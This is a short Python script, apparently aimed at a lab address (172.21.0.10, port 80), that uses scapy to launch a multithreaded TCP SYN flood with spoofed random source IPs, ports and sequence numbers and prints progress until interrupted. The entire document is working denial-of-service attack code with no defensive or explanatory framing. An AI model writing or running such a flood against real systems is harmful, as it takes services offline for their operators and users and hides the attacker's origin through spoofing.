from scapy.all import IP, TCP, send
import random
import threading
import signal
import sys

target_ip = "172.21.0.10"   # Target IP
target_port = 80            # Target port
threads_count = 5           # Number of attack threads
print_interval = 100        # Print status every N packets

stop_event = threading.Event()
packet_counter = 0
lock = threading.Lock()

def syn_flood():
    global packet_counter
    while not stop_event.is_set():
        try:
            # Randomize source IP and source port
            src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            window = random.randint(1000, 65535)

            # Build SYN packet
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=seq, window=window)
            packet = ip_layer / tcp_layer

            # Send packet
            send(packet, verbose=False)

            with lock:
                packet_counter += 1
                if packet_counter % print_interval == 0:
                    print(f"[INFO] Sent {packet_counter} SYN packets...")
        except Exception as e:
            print(f"[ERROR] {e}")

def signal_handler(sig, frame):
    print("\n[!] Stopping SYN flood...")
    stop_event.set()
    sys.exit(0)

# Catch Ctrl + C
signal.signal(signal.SIGINT, signal_handler)

# Start threads
threads = []
for i in range(threads_count):
    t = threading.Thread(target=syn_flood, daemon=True)
    t.start()
    threads.append(t)

print(f"[INFO] SYN Flood attack started on {target_ip}:{target_port} with {threads_count} threads.")
print("[INFO] Press Ctrl + C to stop...")

# Main thread wait
for t in threads:
    t.join()